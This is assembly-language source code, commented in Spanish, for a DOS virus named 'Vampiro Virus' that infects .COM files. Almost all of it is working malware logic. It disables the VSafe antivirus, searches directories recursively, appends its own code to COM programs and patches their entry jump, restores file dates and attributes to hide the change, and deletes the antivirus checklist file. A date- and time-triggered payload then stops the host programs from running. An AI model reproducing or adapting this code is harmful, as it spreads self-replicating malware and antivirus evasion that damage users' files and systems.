.286c
codigo  segment 'code'
	org 100h
	assume cs:codigo,ds:codigo,es:codigo
start   proc far
COMIENZO:
	push    cs				;Guardo CS
	push    cs				;Guardo CS
	pop     ds				;DS<==CS
	pop     es				;ES<==CS

	call    falso_proc			;Llamo al proc. para que me
						; quede en la pila la direccion
						; del proc.
falso_proc      proc near
falso_proc      endp

	pop     bp				;BP<== Direccion del proc.
	sub     bp, 107h			;BP<== BP - Dir. anterior.

;============================DESINSTALAR EL VSAFE==============================
	    mov  dx, 5945h			;Desinstalar Vsafe.
	    mov  ax, 0FA01h
	    int  21h

;=============================CHEQUEO DE PLAYLOAD==============================
;Chequeo la fecha -------------------------------------------------------------
	mov	ah, 2ah				;Obtener fecha actual.
	int	21h				;Devuelve en:
	cmp	dh, 06d				;DH<== Mes.
	jb	intercambio			;Si DH es menor que 6 (Junio),
						; no hago nada.
					;<------ Si llego aca, es porque es
						; mayor que Junio.

;Chequeo la hora --------------------------------------------------------------
	mov	ah, 2ch				;Obtener la hora actual.
	int	21h				;Devuelve en:
	cmp	ch, 22d				;CH<== Hora.
	jb	intercambio			;Si CH es menor que 22hs, salto
						; a intercambio.
					;<------ Si llego hasta aca, es porque
						;cumple con las condiciones.
	jmp	playload			;Voy al playload.

;================================INTERCAMBIO===================================
INTERCAMBIO:
	cld					;Seteo el Direction Flag para
						; que copie hacia delante
	mov	cx, 7				;Cantidad de bytes. (7).
	lea	si, [bp+buffer]			;SI<== offset de BUFFER.
	lea	di, [bp+buffer_act]		;DI<== offset de BUFFER_ACT.
	rep	movsb				;Copia.
						;Ahora en BUFFER_ACT tengo
						; el contenido de BUFFER.

;Salvar el DTA original -------------------------------------------------------
	mov     cx, 43d				;Cantidad de bytes a copiar.
	lea     di, bp+dta_org			;DI<== offset del DTA_ORG
	mov     si, 0080h			;SI<== offset comienzo del DTA
	rep     movsb				;Copia 43 bytes.

;============================PROGRAMA DE BUSQUEDA==============================
;Guardar directorio original --------------------------------------------------
	mov	ah, 47h				;Obtener directorio actual.
	mov	dl, 0				;Unidad por defecto.
						;Devuelve en DS:SI el path
						;sin unidad ni barra.
	lea	si, bp+directorio_original+1	;SI<== offset DIRECTORIO_ORG.
	int	21h

;Buscar la primer entrada -----------------------------------------------------
BUSCAR:	
	mov     ah, 4eh				;Buscar primer entrada.
	lea     dx, bp+directorio		;DS:DX= Direccion de DIRECTORIO
	mov     cx, 00010000b			;Con atributo de directorio
	int     21h

;Verificar si es un directorio ------------------------------------------------
VERIFICAR:
	push    0095h				;Pusheo el offset del DTA
						; de los atributos
	pop     bx				;Y lo guardo en BX
	mov     al, [bx]			;Le paso a AL (Nibble donde
						; se encuentra el bit de
						; directorio) el contenido de
						; BX (bits de atributos).
	shr     ax, 4				;Muevo a AX 4 bits a la derecha
						; para poner en 0 a los mas
						; significativos que el bit de
						; DIRECTORIO.
	shl     ax, 7				;Muevo a AX 7 bits a la izq.
						; para poner en 0 los menos
						; significativos que DIRECTORIO
	cmp     ax, 10000000b			;Comparo AX con 10000000, donde
						; el 1 es el bit de DIRECTORIO.
	jne     dir	

;Verificar si el directorio es relativo ("." o "..") --------------------------

	lea     si, bp+actual			;SI<== offset de ACTUAL
	mov     di, 009eh			;DI<== offset del DTA donde
						; esta el Filename.
	cmpsb					;Comparo 1 byte.
	je      dir				;Si coincidio, voy a DIR.
	mov     cx, 0002h			;CX<== 1. Comparo 2 bytes.
	lea     si, bp+retroceso		;SI<== offset de RETROCESO
	mov     di, 009eh			;DI<== offset del DTA donde
						; esta el Filename.
	repe    cmpsb				;Repite mientras coinciden.
	je      dir				;Si coincidieron, salto a DIR.
					
;Cambiar de directorio --------------------------------------------------------
CAMBIO:
	mov     ah, 3bh				;Cambiar de directorio.
	mov     dx, 009eh			;DS:DX= offset del DTA
 	int     21h

;Salvar el DTA actual ---------------------------------------------------------
	mov     cx, 43d				;Cantidad de bytes a copiar.
	lea     di, bp+dta			;DI<== offset del DTA_ORG
	mov     si, 0080h			;SI<== offset comienzo del DTA
	rep     movsb				;Copia 43 bytes.

;Buscar el primer file --------------------------------------------------------
	mov     ah, 4eh				;Buscasr 1er file.
	lea     dx, bp+file_inf                 ;DS:DX= offset de FILE_INF
	mov     cx, 0				;Atributos de la entrada.
	int     21h
	jc      retro2				;Si encontro algun file, salta
						; a FILE_A_INFECTAR.
					;<----- Si llego hasta aca es porque
						;no encontro ningun file.
	jmp	file_a_infectar			;Salto a RETRO.

;Buscar el proximo file -------------------------------------------------------
SEARCH:
	mov     ah, 4fh				;Busca el proximo file.
	int     21h
	jc      retro2				;Si encontro algun file, salta
	jmp	file_a_infectar			; a FILE_A_INFECTAR.

;Retroceder de directorio -----------------------------------------------------
RETRO:
	mov     ah, 3bh                         ;Cambiar de directorio.
	lea     dx, bp+retroceso		;DX<== offset de RETROCESO.
	int     21h
	jnc	buscar
	jmp	no_infectar

;Retroceder de directorio -----------------------------------------------------
RETRO2:
	mov     ah, 3bh                         ;Cambiar de directorio.
	lea     dx, bp+retroceso		;DX<== offset de RETROCESO.
	int     21h
	jnc	act_dta
	jmp	no_infectar

;Buscar el proximo directorio -------------------------------------------------
DIR:
	mov     ah, 4fh				;Buscar la proxima entrada.
	int     21h
	jnc     verificar
	jmp	retro

;Actualizo DTA ----------------------------------------------------------------
ACT_DTA:
	mov     cx, 43d				;Cantidad de bytes a copiar.
	lea     si, bp+dta			;SI<== offset de var. DTA.
	mov     di, 0080h			;DI<== offset del comienzo DTA.
	rep     movsb				;Copia 43 bytes.
	jmp	dir
	
;========================FIN DE PROGRAMA DE BUSQUEDA===========================


;==============================INFECTAR FILE===================================
FILE_A_INFECTAR:
;Comprobar que no sea el command.com ------------------------------------------
	mov     cx, 12d                         ;Son 12 bytes.
	mov     si, 009eh			;SI<== offset del Filename DTA.
	lea     di, bp+command			;DI<== offset COMMAND.
	repe    cmpsb                           ;Compara.
	jne     continuar			;Si hay error, salta CONTINUAR.
	jmp     search				;Si no, salta a SEARCH.

;Verificar longitud -----------------------------------------------------------
CONTINUAR:
	mov     cx, 2				;Copiar 2 bytes.
	mov     si, 009ah			;SI<== offset del DTA (long.).
	lea     di, bp+longitud			;DI<== offset de LONGITUD.
	rep     movsb				;Copia.
	sub	word ptr [bp+longitud], 3	;Resto 3 bytes a [LONGITUD].

;Comprobar longitud que no sea mayor a 64000 bytes-----------------------------
	cmp	word ptr [bp+longitud], 64000d	;Comparo longitud con 64000.
	jb	c				;Si long. es menor, salto a C.
	jmp	search				;Si no, salto a SEARCH.

;Guardar atributos del file ---------------------------------------------------
C:
	mov	ax, 4300h			;Obtener atributos.
	mov	dx, 009eh			;DX<== offset del Filename DTA.
	int	21h				;Devuelve atribs. en CX.
	mov	word ptr [bp+atributos],cx	;Paso CX a ATRIBUTOS.

;Setear atributos a R/W -------------------------------------------------------
	mov	ax, 4301h			;Setear atributos.
	mov	cx, 0000h			;Seteo atrib. a "normal"
	int	21h

;Abrir file -------------------------------------------------------------------
	mov     ah, 3dh				;Abro file.
	mov     al, 00000010b			;Para lectura/escritura.
	mov     dx, 009eh			;DX<== offset del DTA(Filename)
	int     21h                             ;El handle viene al AX.
	push    ax                              ;Lo guardo.

;Leo los 7 primeros bytes -----------------------------------------------------
	pop     bx                              ;Paso el handle a BX.
	push    bx				;Y lo guardo.
	mov     ah, 3fh                          ;Leer file.
	mov     cx, 0007h			;Leer 7 bytes.
	lea     dx, bp+buffer                   ;Para guardarlo en el buffer.
	int     21h

;Comprobar MZ -----------------------------------------------------------------
	cmp	word ptr [bp+buffer],'ZM'	;Comparo con ZM.
	jne	d
	jmp	cerrar

;Comprobar infeccion ----------------------------------------------------------
D:
	mov     cx, 4d                          ;Son 4 bytes.
	lea     si, bp+string                   ;Comparar la var. string.
	lea     di, bp+buffer                   ;Con la var. buffer.
	add     di, 3d                          ;Salterar los 3 primeros bytes.
	repe    cmpsb                           ;Realiza comparacion.
	jne     infectar			;Te caga el file.

;Cerrar file porque esta apestado ---------------------------------------------
CERRAR:
	pop     bx                              ;Saco el handle.
	push    bx                              ;Y lo guardo.
	mov     ah, 3eh				;Cerrar file.
	int     21h

;Restauro atributos del file original -----------------------------------------
	mov	ax, 4301h			;Restauro atributos originales.
	mov	cx, word ptr [bp+atributos]	;CX<== ATRIBUTOS.
	mov	dx, 009eh			;DX<== offset del Filename DTA.
	int	21h
	jmp     search

;=============================INFECTAR EN SI===================================
INFECTAR:
;Guardar fecha del file -------------------------------------------------------
	pop	bx				;BX<== Handle.
	push	bx				;Stack<== Handle.
	mov	ax, 5700h			;Obtener fecha.
						;Devuelve en CX y DX.
	int	21h
	mov	word ptr [bp+fecha],cx		;Paso CX a FECHA.
	mov	word ptr [bp+fecha+2],dx	;Paso DX a FECHA+2.


;Mover puntero al principio ---------------------------------------------------
	mov	ax, 4200h			;Muevo el puntero de escritura
						; al principio del prog.
	mov     cx, 0000h
	mov     dx, 0000h
	int     21h

;Escrivo el primer byte(jmp) --------------------------------------------------
	mov     ah, 40h				;Escribir el 1er. byte.
	mov     cx, 1d				;Cantidad=1.
	lea     dx, bp+jump			;DX<== offset de JUMP
	int     21h

;Escrivo longitud o sea, completo el jmp --------------------------------------
	mov     ah, 40h				;Escribo.
	mov     cx, 2d                          ;Cantidad de bytes.
	lea     dx, bp+longitud			;DX<== offset de LONGITUD.
	int     21h

;Escrivo los 4 del string -----------------------------------------------------
	mov     ah, 40h				;Escribo.
	mov     cx, 4d				;Cantidad.
	lea     dx, bp+string			;DX<== offset de STRING.
	int     21h

;Mover puntero al final -------------------------------------------------------
	mov	ax, 4202h			;Muevo el puntero de escritura
						; al final del prog.
	mov     cx, 0000h
	mov     dx, 0000h
	int     21h
	add	word ptr [bp+longitud],3	;Restauro LONGITUD.

;Copio el virus al programa ---------------------------------------------------
	pop     bx				;Restauro el handle.
	mov     ah, 40h				;Servicio.
	mov     cx, 1000d			;Cantidad de bytes a copiar.
						;Realmente son 874 bytes, pero
						; agregamos hasta 1000 de
						; basura.
	lea 	dx, bp+comienzo			;Copiar desde...
	int     21h

;Restauro la fecha del file original ------------------------------------------
	mov	ax, 5701h			;Restauro fecha original.
	mov	cx, word ptr [bp+fecha]		;Paso FECHA a CX.
	mov	dx, word ptr [bp+fecha+2]	;Paso FECHA+2 a DX.
	int 21h

;Cierro el file luego de haberlo infectado ------------------------------------
	mov     ah, 3eh				;Cerrar file.
	int     21h

;Restauro atributos del file original -----------------------------------------
	mov	ax, 4301h			;Restauro atributos originales.
	mov	cx, word ptr [bp+atributos]	;CX<== ATRIBUTOS.
	mov	dx, 009eh			;DX<== offset del Filename DTA.
	int	21h

;===============================BORRAR CHECKLISTS==============================
;Setear atributos a R/W -------------------------------------------------------
	mov	ax, 4301h			;Setear atributos.
	mov	cx, 0000h			;Seteo atrib. a "normal"
	lea	dx, bp+checklist		;DX<== offset de CHECKLIST.
	int	21h

;Borrar directamente el Checklist ---------------------------------------------
	mov	ah,41h				;Servicio.
	int	21h

;=============================NO INFECTAR NADA=================================
NO_INFECTAR:
;========================VOLVER AL DIRECTORIO ORIGINAL=========================

;Volver al directorio original-------------------------------------------------
	mov     ah, 3bh                         ;Cambiar de directorio.
	lea     dx, bp+directorio_original	;DX<== offset de RETROCESO.
	int     21h

;Actualizar todo el DTA -------------------------------------------------------
	mov     cx, 43d				;Cantidad de bytes a copiar.
	lea     si, bp+dta_org			;SI<== offset de var. DTA.
	mov     di, 0080h			;DI<== offset del comienzo DTA.
	rep     movsb				;Copia 43 bytes.


;=======================DEVUELVE EL CONTROL AL ANFITRION=======================
;Copiar el buffer con los 7 primeros byte del file a memoria ------------------
	mov	cx, 0007h			;Cantidad de bytes (7).
	mov	di, 0100h			;DI<== offset 100h. Comienzo
						; del prog. en memoria.
	lea	si, bp+buffer_act		;SI<== offset del BUFFER_ACT.
	rep	movsb				;Copia.

;Saltar al offset 100h --------------------------------------------------------

	mov	ax, 0100h			;Direccion para ejecucion del
	jmp	ax				; anfitrion.

;=================================PLAYLOAD=====================================
PLAYLOAD:
	mov	ah, 09h				;Imprimir cadena.
	lea	dx, bp+mensaje			;DX<== offset de MENSAJE.
	int	21h				;

	mov 	ah, 4ch				;Terminar y no ejecutar el file
	int	21h				; una mierda.

start   endp
;==============================AREA DE DATOS===================================

buffer			db 7d dup(0)
buffer_act		db 7d dup(0)
dta			db 43d dup(0)
dta_org			db 43d dup(0)
longitud		db 2 dup(0)
fecha			db 4 dup(0)
atributos		db 2 dup(0)
directorio_original	db '\',64 dup(0)
mensaje			db 'Zarathustra & Drako les comunican que llego la '
                        db 'hora de ir a dormir. Shh!                '
			db 'Vampiro Virus.$'
directorio		db '*.*',0
actual			db '.',0
retroceso		db '..',0
file_inf		db '*.COM',0
checklist		db 'chklist.ms',0
string			db '›½è˜',0
jump			db 'é',0
command			db 'COMMAND.COM',0
 
codigo  ends
end     start
